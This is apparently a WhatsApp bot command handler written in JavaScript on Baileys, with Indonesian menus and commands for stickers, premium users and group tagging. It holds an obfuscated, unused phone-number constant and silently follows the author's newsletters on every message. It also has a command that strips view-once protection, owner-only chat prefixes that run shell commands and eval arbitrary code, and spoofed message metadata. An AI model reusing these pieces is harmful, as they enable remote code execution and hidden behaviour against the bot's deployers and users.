require('./config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os')
const crypto = require('crypto');
const { SnackVideo } = require('./lib/function/snackvideo')
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
const {
    spawn, 
    exec,
    webp2mp4File,
    execSync 
   } = require('child_process');
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')

module.exports = Denzy = async (Denzy, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        
        const sender = m.key.fromMe ? Denzy.user.id.split(":")[0] + "@s.whatsapp.net" || Denzy.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        
        const premium = JSON.parse(fs.readFileSync("./lib/database/premium.json"))
        const kontributor = JSON.parse(fs.readFileSync('./lib/database/owner.json'));
        const botNumber = await Denzy.decodeJid(Denzy.user.id);
        const isDenzy = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const SlncDenzy = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
        const isPremium = premium.includes(m.sender)
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await Denzy.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${namaowner}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6282278097863:+6282278097863\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
        const reply = (teks) => {
Denzy.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 999,
isForwarded: true,
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `${global.namaBot}`,
"body": `${pushname} 👋🏻`,
"previewType": "VIDEO",
"thumbnailUrl": 'https://c.termai.cc/i28/FaQ',
"sourceUrl": 'https://github.com/DENZY-OFFICIAL'}}},
{ quoted: qkontak})
}
        const {
            smsg,
            fetchJson, 
            sleep,
            formatSize
            } = require('./lib/myfunction');
             //theme sticker reply
        const Denzywet = () => {
        let DenzyStikRep = fs.readFileSync('./lib/sticker_reply/wait.webp')
        Denzy.sendMessage(from, { sticker: DenzyStikRep }, { quoted: m })
        }
        const Denzyadmn = () => {
        let DenzyStikRep = fs.readFileSync('./lib/sticker_reply/admin.webp')
        Denzy.sendMessage(from, { sticker: DenzyStikRep }, { quoted: m })
        }
        const Denzybotadmin = () => {
        let DenzyStikRep = fs.readFileSync('./lib/sticker_reply/botadmin.webp')
        Denzy.sendMessage(from, { sticker: DenzyStikRep }, { quoted: m })
        }
        const Denzyowner = () => {
        let DenzyStikRep = fs.readFileSync('./lib/sticker_reply/owner.webp')
        Denzy.sendMessage(from, { sticker: DenzyStikRep }, { quoted: m })
        }
        const Denzyongb = () => {
        let DenzyStikRep = fs.readFileSync('./lib/sticker_reply/group.webp')
        Denzy.sendMessage(from, { sticker: DenzyStikRep }, { quoted: m })
        }
        const Denzypriv = () => {
        let DenzyStikRep = fs.readFileSync('./lib/sticker_reply/prem.webp')
        Denzy.sendMessage(from, { sticker: DenzyStikRep }, { quoted: m })
        }
        let cihuy = fs.readFileSync('./lib/media/th.jpg')
        Denzy.newsletterFollow('120363399979808917@newsletter')
        Denzy.newsletterFollow('120363342327876451@newsletter')
        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#00FF00").black(
                    `   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
                    `   ⌬ Pesan: ${m.body || m.mtype} \n` +
                    `   ⌬ Pengirim: ${pushname} \n` +
                    `   ⌬ JID: ${senderNumber}`
                )
            );
            
            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#00FF00").black(
                        `   ⌬ Grup: ${groupName} \n` +
                        `   ⌬ GroupJid: ${m.chat}`
                    )
                );
            }
            console.log();
        }
        
        const reaction = async (jidss, emoji) => {
            Denzy.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
/////// AWAL FUNC /////////

// LAST FUNC //
async function getBuffer(url) {
    const res = await axios.get(url, { responseType: 'arraybuffer' });
    return Buffer.from(res.data);
}

        
        async function loading() {
    return reply("Sedang memuat Wak...");
}
        

        switch (command) {
                case "menu": {
        let menu = `*ʜᴀʟʟᴏ ${pushname}.*  ɴᴀᴍᴀ ꜱᴀʏᴀ ᴀᴅᴀʟᴀʜ *${namaBot}*, ʏᴀɴɢ ʙɪsᴀ ᴍᴇᴍʙᴀɴᴛᴜ ᴋᴀᴍᴜ

ʙᴏᴛ ɪɴɪ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʙᴇʀʙᴀɢᴀɪ ᴍᴀᴄᴀᴍ, ʙᴏᴛ ɪɴɪ ᴄᴏᴄᴏᴋ ᴜɴᴛᴜᴋ ᴊᴀɢᴀ ɢʀᴜᴘ. ᴋᴀᴍᴜ ʙɪsᴀ ɢᴜɴᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ ᴜɴᴛᴜᴋ ᴜɴᴅᴜʜ ᴍᴇᴅɪᴀ,ᴇᴅᴜᴋᴀsɪ, ʙᴇʟᴀᴊᴀʀ ᴅᴀɴ ʟᴀɪɴɴʏᴀ, ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴜᴀᴛ ʟᴇʙɪʜ ᴍᴜᴅᴀʜ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ sᴇʜᴀʀɪ ʜᴀʀɪ

✘ ᴄʀᴇᴀᴛᴏʀ: ${namaowner}

┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴜsᴇʀ\` ━━
║◦ɴᴀᴍᴀ: *${pushname}* 
║◦ɴᴏᴍᴏʀ : ${m.sender.split("@")[0]}
┗━━━━━━━━━━━━

┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʙᴏᴛ\` ━━
║◦ɴᴀᴍᴀ ʙᴏᴛ: *${namaBot}*  
║◦ᴘᴇɴɢᴇᴍʙᴀɴɢ: *${namaowner}*  
║◦ᴍᴏᴅᴇ: *${Denzy.public ? 'ᴘᴜʙʟɪᴄ' : 'sᴇʟғ'}*  
┗━━━━━━━━━━━━ `
Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: '𝘊𝘰𝘯𝘵𝘢𝘤𝘵 𝘖𝘸𝘯𝘦𝘳' },
      type: 1
    },
    {
    buttonId: `.sc`,
      buttonText: { displayText: '𝘴𝘤𝘳𝘪𝘱𝘵' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select This Menu',
          sections: [
            {
              title: 'Select This Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'ALL MENU',
                  id: '.allmenu'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
       image: { url: thumbnail },
       caption: menu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "—You Know Denzy?",
      newsletterJid: `120363342327876451@newsletter`,
            },
      externalAdReply: {
        showAdAttribution: true, 
        title: namaBot,
        body: namafile,
        thumbnailUrl: 'https://files.catbox.moe/tn2gvg.jpg',
        sourceUrl: ch,
        mediaType: 1,
        renderLargerThumbnail: false
      }
    }
    }, {
                        quoted: qkontak
                    })
                    await sleep(2500)
     Denzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./denzy1.m4a'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: fvn
                    })
                    }
break
// 𝘋𝘌𝘕𝘡𝘠 𝘕𝘌𝘌𝘋 𝘎𝘐𝘙𝘓🥺
            case "allmenu": {
    let apip = `
┏━━━❖ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ❖━━━
┃  𝙃𝙄 ${pushname}  
┃  𝗕𝗢𝗧: ${global.namaBot}  
┃  𝗠𝗢𝗗𝗘: ${Denzy.public ? 'Public' : 'Self'}  
┃  𝗨𝗦𝗘𝗥: @${m.sender.split('@')[0]}  
┗━━━━━━━⭑
┏━━━❖ 𝙊𝙏𝙃𝙀𝙍 𝙈𝙀𝙉𝙐 ❖━━━
│金 . ${prefix}ʀᴠᴏ
│金 . ${prefix}ᴛǫᴛᴏ
│金 . ${prefix}ᴍᴏᴅᴇ
│金 . ${prefix}ᴀᴅᴅᴘʀᴇᴍ
│金 . ${prefix}ᴅᴇʟᴘʀᴇᴍ
│金 . ${prefix}ʙʀᴀᴛ
│金 . ${prefix}sᴛɪᴄᴋᴇʀ
│金 . ${prefix}ʜɪᴅᴇᴛᴀɢ
│金 . ${prefix}ᴛᴀɢᴀʟʟ
╰━━━━━━━━━❏
`
Denzy.sendMessage(m.chat, {
        document: fs.readFileSync("./package.json"),
        fileName: "You Know Denzy?",
        mimetype: "application/pdf",
        fileLength: 999999999999,
        pageCount: 999,
        caption: apip,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [sender],
            forwardedNewsletterMessageInfo: {
                newsletterName: "—You Know Denzy? ",
                newsletterJid: `120363399979808917@newsletter`,
            },
            externalAdReply: {  
             title: namaBot,
              body: namafile,
                thumbnailUrl: thumbnail,
                sourceUrl: yt, 
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: qkontak
                    })
     Denzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./lib/media/denzy.m4a'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: m
                    })
await Denzy.sendMessage(m.chat, { react: { text: "🤍",key: m.key,}})
await Denzy.sendMessage(m.chat, { react: { text: "🩶",key: m.key,}})
await Denzy.sendMessage(m.chat, { react: { text: "🩵",key: m.key,}})
await Denzy.sendMessage(m.chat, { react: { text: "🩷",key: m.key,}})
await Denzy.sendMessage(m.chat, { react: { text: "💛",key: m.key,}})
await Denzy.sendMessage(m.chat, { react: { text: "❤️",key: m.key,}})
await Denzy.sendMessage(m.chat, { react: { text: "💔",key: m.key,}})  
}
          break         
// 𝘋𝘌𝘕𝘡𝘠 𝘕𝘌𝘌𝘋 𝘎𝘐𝘙𝘓🥺
          case "rvo": {
if (!isDenzy) return reply(mess.owner)
if (!m.quoted) return reply(
`*❌Syntax Error!!*
*Example:* Reply ViewOnce with caption ${prefix + command}`);
try {
let buffer = await m.quoted.download();
let type = m.quoted.mtype;
let sendOptions = { quoted: m };
if (type === "videoMessage") {
await Denzy.sendMessage(m.chat, { video: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "imageMessage") {
await Denzy.sendMessage(m.chat, { image: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "audioMessage") {
await Denzy.sendMessage(m.chat, { 
audio: buffer, 
mimetype: "audio/mpeg", 
ptt: m.quoted.ptt || false 
}, sendOptions);
} else {
return reply("❌ Media View Once tidak didukung.");
}} catch (err) {
console.error(err)}}
break;
case 'sc': {
let name = m.pushName || Denzy.getName(m.sender);
let panduan = ``

const url = 'https://c.termai.cc/i28/FaQ'
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: Denzy.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: panduan
          },
          carouselMessage: {
            cards: [
              {                   
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://c.termai.cc/i28/FaQ' } }, { upload: Denzy.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: '⏤̋͢͠𝐰̣.𝐜𝐞𝐨/𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐞𝐧𝐳𝐲𝐱𝐳',
          hasMediaAttachment: true
        }),
                body: {
                  text: `\`JANGAN SPAM CHAT DAN CALL\``
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"SCRIPT ADA DI GITHUB","url":"https://github.com/DENZY-OFFICIAL","merchant_url":"https://www.google.com"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    }
  },
  {}
);

await Denzy.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});
}
break
// 𝘋𝘌𝘕𝘡𝘠 𝘕𝘌𝘌𝘋 𝘎𝘐𝘙𝘓🥺
case 'mode': {
if (!isDenzy) return reply(mess.owner)
let mode = `𝘽𝙤𝙩 𝙉𝙮𝙖 𝙈𝙖𝙪 𝘿𝙞 𝙈𝙤𝙙𝙚 𝘼𝙥𝙖 𝙉𝙞𝙝 𝙆𝙞𝙣𝙜`
await Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'List Menu',
          sections: [
            {
              title: 'List Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'MODE SAD (MODE SELF)',
                  id: '.self'
                },                
                {
                  title: 'MODE HAPPY (MODE PUBLIC)',
                  id: '.public'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: namafile,
  mimetype: 'application/pdf',
  fileLength: "999999999999",
  caption: mode,
  contextInfo: {
   forwardedNewsletterMessageInfo: {
   newsletterJid: idch,
   newsletterName: namach,
   },   
    externalAdReply: {
      title: namaBot,
      body: namaowner,
      thumbnailUrl: thumbnail,
      sourceUrl: yt,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break
// 𝘋𝘌𝘕𝘡𝘠 𝘕𝘌𝘌𝘋 𝘎𝘐𝘙𝘓🥺
case "brat": {
if (!text) return reply('teksnya')
let brat = `https://fgsi-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=false`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await Denzy.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break
// 𝘋𝘌𝘕𝘡𝘠 𝘕𝘌𝘌𝘋 𝘎𝘐𝘙𝘓🥺
case 's':
case 'stiker':
case 'sticker': {
  if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Denzy.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await Denzy.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
// 𝘋𝘌𝘕𝘡𝘠 𝘕𝘌𝘌𝘋 𝘎𝘐𝘙𝘓🥺
case "listprem": {
if (!isDenzy) return reply(mess.owner)
if (premium.length < 1) return reply("𝘕𝘰 𝘏𝘢𝘷𝘦 𝘜𝘴𝘦𝘳 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 :(")
let teks = `\n𝘓𝘪𝘴𝘵 𝘈𝘭𝘭 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 𝘜𝘴𝘦𝘳\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Denzy.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: qkontak})
}
break
// 𝘋𝘌𝘕𝘡𝘠 𝘕𝘌𝘌𝘋 𝘎𝘐𝘙𝘓
case "addprem": {
if (!isDenzy) return reply(mess.owner)
if (!text && !m.quoted) return reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return reply(`𝘕𝘰𝘮𝘰𝘳 ${input2} 𝘴𝘶𝘥𝘢𝘩 𝘔𝘦𝘯𝘫𝘢𝘥𝘪 𝘙𝘦𝘴𝘦𝘭𝘭𝘦𝘳!`)
premium.push(input)
await fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium, null, 2))
}
break
// 𝘋𝘌𝘕𝘡𝘠 𝘕𝘌𝘌𝘋 𝘎𝘐𝘙𝘓🥺
case "dellprem": {
    if (!isDenzy) return reply(mess.owner)
if (!m.quoted && !text) return reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Delete success`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴 𝘛𝘰 𝘋𝘦𝘭𝘦𝘵𝘦 𝘗𝘳𝘦𝘮𝘪𝘶𝘮`)
}
break
// 𝘋𝘌𝘕𝘡𝘠 𝘕𝘌𝘌𝘋 𝘎𝘐𝘙𝘓🥺
case "public":{
                if (!isDenzy) return reply(mess.owner) 
                Denzy.public = true
                reply(`successfully changed to ${command}`)
            }
            break
            case "self":{
                if (!isDenzy) return reply(mess.owner) 
                Denzy.public = false
                reply(`successfully changed to ${command}`)
            }
            break
                
            case 'tagall':{
                if (!isDenzy) return reply(mess.owner)
                if (!m.isGroup) return reply(mess.group);
                
                const textMessage = args.join(" ") || "nothing";
                let teks = `tagall message :\n> *${textMessage}*\n\n`;

                const groupMetadata = await Denzy.groupMetadata(m.chat);
                const participants = groupMetadata.participants;

                for (let mem of participants) {
                    teks += `@${mem.id.split("@")[0]}\n`;
                }

                Denzy.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map((a) => a.id)
                }, { quoted: m });
            }
            break         
            
            case "h":
            case "hidetag": {
                if (!m.isGroup) return reply(mess.group)
                if (!isDenzy) return reply(mess.owner)
                if (m.quoted) {
                    Denzy.sendMessage(m.chat, {
                        forward: m.quoted.fakeObj,
                        mentions: participants.map(a => a.id)
                    })
                }
                if (!m.quoted) {
                    Denzy.sendMessage(m.chat, {
                        text: q ? q : '',
                        mentions: participants.map(a => a.id)
                    }, { quoted: m })
                }
            }
            break
            // 𝘋𝘌𝘕𝘡𝘠 𝘕𝘌𝘌𝘋 𝘎𝘐𝘙𝘓🥺
            default:
                if (budy.startsWith('$')) {
                    if (!isDenzy) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout);
                    });
                }
                
                if (budy.startsWith('>')) {
                    if (!isDenzy) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await reply(evaled);
                    } catch (err) {
                        reply(String(err));
                    }
                }
        
                if (budy.startsWith('<')) {
                    if (!isDenzy) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await reply(require('util').format(teks))
                    }
                }
        
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
